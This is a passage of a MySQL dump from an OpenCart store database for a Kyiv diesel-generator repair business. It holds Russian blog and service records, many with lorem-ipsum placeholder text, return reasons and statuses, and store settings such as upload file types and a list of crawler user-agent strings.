16:26:02',29),(10,8,'',3,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-03-12 18:39:21','2033-03-03 00:00:00','2016-03-12 18:39:44','2016-03-12 18:40:03',12),(11,9,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-03-12 18:44:20','2033-03-03 00:00:00','2016-03-12 18:44:59','0000-00-00 00:00:00',20),(12,10,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-03-12 18:54:16','2033-03-03 00:00:00','2016-03-12 18:54:41','2016-03-12 19:50:17',12);
/*!40000 ALTER TABLE `oc_record` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_attribute` WRITE;
/*!40000 ALTER TABLE `oc_record_attribute` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_record_attribute` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_description` WRITE;
/*!40000 ALTER TABLE `oc_record_description` DISABLE KEYS */;
INSERT INTO `oc_record_description` VALUES (7,1,'Заказать обратный звонок','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(7,3,'Заказать обратный звонок','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(7,4,'Заказать обратный звонок','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(2,1,'Раздел о конверсионных электростанциях','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','Раздел о конверсионных электростанциях','Раздел о конверсионных электростанциях','Раздел о конверсионных электростанциях','Раздел о конверсионных электростанциях'),(2,3,'Раздел о конверсионных электростанциях','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(2,4,'Раздел о конверсионных электростанциях','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(8,1,'Блог1','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','&lt;h3 class=&quot;section-title&quot; style=&quot;font-family: \'Open Sans\', sans-serif; color: rgb(0, 0, 0);&quot;&gt;&lt;img src=&quot;http://shop/catalog/view/theme/service/image/product1.jpg&quot; alt=&quot;&quot; style=&quot;font-size: 14px; line-height: 20px; background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/h3&gt;&lt;p class=&quot;section-description&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/p&gt;','Блог1','Блог1','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excep','БлогиБлогиБлоги'),(8,3,'Блог1','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(8,4,'Блог1','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(9,3,'Блог2','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','Блог2','Блог2','',''),(9,1,'Блог2','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;','Блог2','Блог2','',''),(9,4,'Блог2','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','Блог2','Блог2','',''),(10,3,'Блог 3','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(10,1,'Блог 3','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;','Блог 3','Блог 3','',''),(10,4,'Блог 3','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(11,1,'Новость 1','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;','Новость 1','Новость 1','',''),(11,3,'Новость 1','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(11,4,'Новость 1','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(12,3,'Проект 1','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(12,1,'Проект 1','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','&lt;p&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-size: 15.4px; line-height: 22px;&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;','Проект 1','Проект 1','',''),(12,4,'Проект 1','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(3,1,'Раздел о системах управления ДГУ','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab!','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum','Раздел о системах управления ДГУ','Раздел о системах управления ДГУ','Раздел о системах управления ДГУ','Раздел о системах управления ДГУ'),(3,3,'Раздел о системах управления ДГУ','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(3,4,'Раздел о системах управления ДГУ','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(6,1,'Ремонт дизельных генераторов и электростанций в Киеве','Наше предприятие оказывает широкий спектр услуг на ремонт и техническое обслуживание дизельных электростанций и генераторов в Киеве. На все проведенные работы мы в обязательном порядке предоставляем гарантию. Многолетний опыт проводимых работ, а также качественное техническое обеспечение вместе с профессиональным коллективом специалистов, позволяют нам решать любые технически сложные задачи. ','&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Рабочие механизмы дизельных двигателей, как правило, имеют высокую надежность и прочность, таким образом, ремонтные работы дизельных моторов проводятся в несколько раз реже, чем ремонт бензиновых. Дизельный двигатель – это надежный силовой агрегат практически любой машины, но рано или поздно он все равно будет нуждаться в основательном ремонте.&amp;nbsp;&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Качество выполненных работ напрямую влияет на цену ремонта дизельных генераторов. Так как для этого требуется специальное оборудование, а также аппаратура для диагностики.&lt;/div&gt;&lt;h2 align=&quot;center&quot; style=&quot;line-height: 17px; font-weight: bold; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; font-size: 13px; color: rgb(0, 0, 0); padding: 0px; font-family: Verdana; text-align: justify;&quot;&gt;&amp;nbsp;&lt;/h2&gt;&lt;h2 align=&quot;center&quot; style=&quot;line-height: 17px; font-weight: bold; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; font-size: 13px; color: rgb(0, 0, 0); padding: 0px; font-family: Verdana; text-align: justify;&quot;&gt;Обслуживание дизель генераторов&lt;/h2&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Наше предприятие оказывает широкий спектр услуг на ремонт и техническое обслуживание дизельных электростанций и генераторов в Киеве. На все проведенные работы мы в обязательном порядке предоставляем гарантию. Многолетний опыт проводимых работ, а также качественное техническое обеспечение вместе с профессиональным коллективом специалистов, позволяют нам решать любые технически сложные задачи.&amp;nbsp;&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Ключевыми факторами успеха нашей компании является взаимовыгодное и долгосрочное партнерство с клиентами, наши специалисты выполнят сервисное обслуживание электростанций и генераторов любой сложности.&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Наш сервис – это Ваша уверенность в завтрашнем дне, а также гарантии того, что отремонтированное оборудование будет находиться в отличном состоянии на протяжении всего срока эксплуатации.&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Наши преимущества:&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;1. Наличие собственной ремонтной базы, диагностического оборудования, специальных ремонтных инструментов.&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;2. В процессе выполнения ремонтных работ мы не только руководствуемся рекомендациями заводами – изготовителями, но также применяем индивидуальные решения для ремонта.&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;3. Все наши специалисты являются профессиональными мастерами и имеют соответствующие сертификаты.&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Основная специализация нашего предприятия ремонт электростанций и дизельных генераторов на базе двигателей: Perkins, Deutz, Man, Iveco, Lamborghini. Опытные специалисты компании « Спец-Сервис» помогут Вам в самые быстрые сроки решить все вопросы по ремонту и сервисному обслуживанию.&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;div style=&quot;color: rgb(44, 44, 44); font-family: Verdana; font-size: 11px; line-height: 17px; text-align: justify;&quot;&gt;Обратившись к нам – Вы сможете быть уверенными в высоком качестве всех осуществляемых нами работ, индивидуальном подходе к каждому клиенту, а также высокой квалификации мастеров предприятия «Спец-Сервис».&lt;/div&gt;','Ремонт дизельных генераторов и электростанций в Киеве','Ремонт дизельных генераторов и электростанций в Киеве','Новая услуга','Новая услуга'),(6,3,'Новая услуга','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','',''),(6,4,'Новая услуга','','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','','','','');
/*!40000 ALTER TABLE `oc_record_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_image` WRITE;
/*!40000 ALTER TABLE `oc_record_image` DISABLE KEYS */;
INSERT INTO `oc_record_image` VALUES (1,12,'catalog/logo.png','YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9',0),(4,8,'catalog/engine-example.jpg','YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9',0),(11,3,'catalog/engine-example.jpg','YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9',0),(10,2,'catalog/product1.jpg','YTo0OntzOjU6InRpdGxlIjthOjM6e2k6MTtzOjA6IiI7aTozO3M6MDoiIjtpOjQ7czowOiIiO31zOjExOiJkZXNjcmlwdGlvbiI7YTozOntpOjE7czowOiIiO2k6MztzOjA6IiI7aTo0O3M6MDoiIjt9czozOiJ1cmwiO2E6Mzp7aToxO3M6MDoiIjtpOjM7czowOiIiO2k6NDtzOjA6IiI7fXM6ODoicmVzZXJ2ZWQiO3M6MDoiIjt9',0);
/*!40000 ALTER TABLE `oc_record_image` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_product_related` WRITE;
/*!40000 ALTER TABLE `oc_record_product_related` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_record_product_related` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_related` WRITE;
/*!40000 ALTER TABLE `oc_record_related` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_record_related` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_tag` WRITE;
/*!40000 ALTER TABLE `oc_record_tag` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_record_tag` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_to_blog` WRITE;
/*!40000 ALTER TABLE `oc_record_to_blog` DISABLE KEYS */;
INSERT INTO `oc_record_to_blog` VALUES (6,6),(7,7),(8,8),(9,8),(10,8),(11,9),(12,10);
/*!40000 ALTER TABLE `oc_record_to_blog` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_to_download` WRITE;
/*!40000 ALTER TABLE `oc_record_to_download` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_record_to_download` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_to_layout` WRITE;
/*!40000 ALTER TABLE `oc_record_to_layout` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_record_to_layout` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record_to_store` WRITE;
/*!40000 ALTER TABLE `oc_record_to_store` DISABLE KEYS */;
INSERT INTO `oc_record_to_store` VALUES (1,0),(2,0),(3,0),(6,0),(7,0),(8,0),(9,0),(10,0),(11,0),(12,0);
/*!40000 ALTER TABLE `oc_record_to_store` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_recurring` WRITE;
/*!40000 ALTER TABLE `oc_recurring` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_recurring` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_recurring_description` WRITE;
/*!40000 ALTER TABLE `oc_recurring_description` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_recurring_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_return` WRITE;
/*!40000 ALTER TABLE `oc_return` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_return` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_return_action` WRITE;
/*!40000 ALTER TABLE `oc_return_action` DISABLE KEYS */;
INSERT INTO `oc_return_action` VALUES (1,1,'Возвращены средства'),(2,1,'Выдан в кредит'),(3,1,'Отправлен другой товар для замены'),(3,4,'Отправлен другой товар для замены'),(2,4,'Выдан в кредит'),(1,4,'Возвращены средства'),(1,3,'Возвращены средства'),(2,3,'Выдан в кредит'),(3,3,'Отправлен другой товар для замены');
/*!40000 ALTER TABLE `oc_return_action` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_return_history` WRITE;
/*!40000 ALTER TABLE `oc_return_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_return_history` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_return_reason` WRITE;
/*!40000 ALTER TABLE `oc_return_reason` DISABLE KEYS */;
INSERT INTO `oc_return_reason` VALUES (1,1,'Получен/доставлен неисправным (сломан)'),(2,1,'Получен не тот (ошибочный) товар'),(4,1,'Ошибка, пожалуйста укажите/приложите подробности'),(5,1,'Другое (другая причина), пожалуйста укажите/приложите подробности'),(5,4,'Другое (другая причина), пожалуйста укажите/приложите подробности'),(4,4,'Ошибка, пожалуйста укажите/приложите подробности'),(1,4,'Получен/доставлен неисправным (сломан)'),(2,4,'Получен не тот (ошибочный) товар'),(1,3,'Получен/доставлен неисправным (сломан)'),(2,3,'Получен не тот (ошибочный) товар'),(4,3,'Ошибка, пожалуйста укажите/приложите подробности'),(5,3,'Другое (другая причина), пожалуйста укажите/приложите подробности');
/*!40000 ALTER TABLE `oc_return_reason` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_return_status` WRITE;
/*!40000 ALTER TABLE `oc_return_status` DISABLE KEYS */;
INSERT INTO `oc_return_status` VALUES (1,1,'Рассматриваемый '),(3,1,'Готов (к отправке) '),(2,1,'Заказ в ожидании '),(2,4,'Заказ в ожидании '),(3,4,'Готов (к отправке) '),(1,4,'Рассматриваемый '),(1,3,'Рассматриваемый '),(3,3,'Готов (к отправке) '),(2,3,'Заказ в ожидании ');
/*!40000 ALTER TABLE `oc_return_status` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_review` WRITE;
/*!40000 ALTER TABLE `oc_review` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_review` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_review_fields` WRITE;
/*!40000 ALTER TABLE `oc_review_fields` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_review_fields` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_setting` WRITE;
/*!40000 ALTER TABLE `oc_setting` DISABLE KEYS */;
INSERT INTO `oc_setting` VALUES (1,0,'shipping','shipping_sort_order','3',0),(2,0,'sub_total','sub_total_sort_order','1',0),(3,0,'sub_total','sub_total_status','1',0),(5,0,'total','total_sort_order','9',0),(6,0,'total','total_status','1',0),(8,0,'free_checkout','free_checkout_sort_order','1',0),(9,0,'cod','cod_sort_order','5',0),(10,0,'cod','cod_total','0.01',0),(11,0,'cod','cod_order_status_id','1',0),(12,0,'cod','cod_geo_zone_id','0',0),(13,0,'cod','cod_status','1',0),(14,0,'shipping','shipping_status','1',0),(15,0,'shipping','shipping_estimator','1',0),(27,0,'coupon','coupon_sort_order','4',0),(28,0,'coupon','coupon_status','1',0),(34,0,'flat','flat_sort_order','1',0),(35,0,'flat','flat_status','1',0),(36,0,'flat','flat_geo_zone_id','0',0),(37,0,'flat','flat_tax_class_id','0',0),(41,0,'flat','flat_cost','5.00',0),(42,0,'credit','credit_sort_order','7',0),(43,0,'credit','credit_status','1',0),(53,0,'reward','reward_sort_order','2',0),(54,0,'reward','reward_status','1',0),(146,0,'category','category_status','1',0),(158,0,'account','account_status','1',0),(159,0,'affiliate','affiliate_status','1',0),(94,0,'voucher','voucher_sort_order','8',0),(95,0,'voucher','voucher_status','1',0),(103,0,'free_checkout','free_checkout_status','1',0),(104,0,'free_checkout','free_checkout_order_status_id','1',0),(2229,0,'config','config_seo_url','0',0),(2230,0,'config','config_file_max_size','300000',0),(2231,0,'config','config_file_ext_allowed','zip\r\ntxt\r\npng\r\njpe\r\njpeg\r\njpg\r\ngif\r\nbmp\r\nico\r\ntiff\r\ntif\r\nsvg\r\nsvgz\r\nzip\r\nrar\r\nmsi\r\ncab\r\nmp3\r\nqt\r\nmov\r\npdf\r\npsd\r\nai\r\neps\r\nps\r\ndoc',0),(2232,0,'config','config_file_mime_allowed','text/plain\r\nimage/png\r\nimage/jpeg\r\nimage/gif\r\nimage/bmp\r\nimage/tiff\r\nimage/svg+xml\r\napplication/zip\r\n&quot;application/zip&quot;\r\napplication/x-zip\r\n&quot;application/x-zip&quot;\r\napplication/x-zip-compressed\r\n&quot;application/x-zip-compressed&quot;\r\napplication/rar\r\n&quot;application/rar&quot;\r\napplication/x-rar\r\n&quot;application/x-rar&quot;\r\napplication/x-rar-compressed\r\n&quot;application/x-rar-compressed&quot;\r\napplication/octet-stream\r\n&quot;application/octet-stream&quot;\r\naudio/mpeg\r\nvideo/quicktime\r\napplication/pdf',0),(2228,0,'config','config_robots','abot\r\ndbot\r\nebot\r\nhbot\r\nkbot\r\nlbot\r\nmbot\r\nnbot\r\nobot\r\npbot\r\nrbot\r\nsbot\r\ntbot\r\nvbot\r\nybot\r\nzbot\r\nbot.\r\nbot/\r\n_bot\r\n.bot\r\n/bot\r\n-bot\r\n:bot\r\n(bot\r\ncrawl\r\nslurp\r\nspider\r\nseek\r\naccoona\r\nacoon\r\nadressendeutschland\r\nah-ha.com\r\nahoy\r\naltavista\r\nananzi\r\nanthill\r\nappie\r\narachnophilia\r\narale\r\naraneo\r\naranha\r\narchitext\r\naretha\r\narks\r\nasterias\r\natlocal\r\natn\r\natomz\r\naugurfind\r\nbackrub\r\nbannana_bot\r\nbaypup\r\nbdfetch\r\nbig brother\r\nbiglotron\r\nbjaaland\r\nblackwidow\r\nblaiz\r\nblog\r\nblo.\r\nbloodhound\r\nboitho\r\nbooch\r\nbradley\r\nbutterfly\r\ncalif\r\ncassandra\r\nccubee\r\ncfetch\r\ncharlotte\r\nchurl\r\ncienciaficcion\r\ncmc\r\ncollective\r\ncomagent\r\ncombine\r\ncomputingsite\r\ncsci\r\ncurl\r\ncusco\r\ndaumoa\r\ndeepindex\r\ndelorie\r\ndepspid\r\ndeweb\r\ndie blinde kuh\r\ndigger\r\nditto\r\ndmoz\r\ndocomo\r\ndownload express\r\ndtaagent\r\ndwcp\r\nebiness\r\nebingbong\r\ne-collector\r\nejupiter\r\nemacs-w3 search engine\r\nesther\r\nevliya celebi\r\nezresult\r\nfalcon\r\nfelix ide\r\nferret\r\nfetchrover\r\nfido\r\nfindlinks\r\nfireball\r\nfish search\r\nfouineur\r\nfunnelweb\r\ngazz\r\ngcreep\r\ngenieknows\r\ngetterroboplus\r\ngeturl\r\nglx\r\ngoforit\r\ngolem\r\ngrabber\r\ngrapnel\r\ngralon\r\ngriffon\r\ngromit\r\ngrub\r\ngulliver\r\nhamahakki\r\nharvest\r\nhavindex\r\nhelix\r\nheritrix\r\nhku www octopus\r\nhomerweb\r\nhtdig\r\nhtml 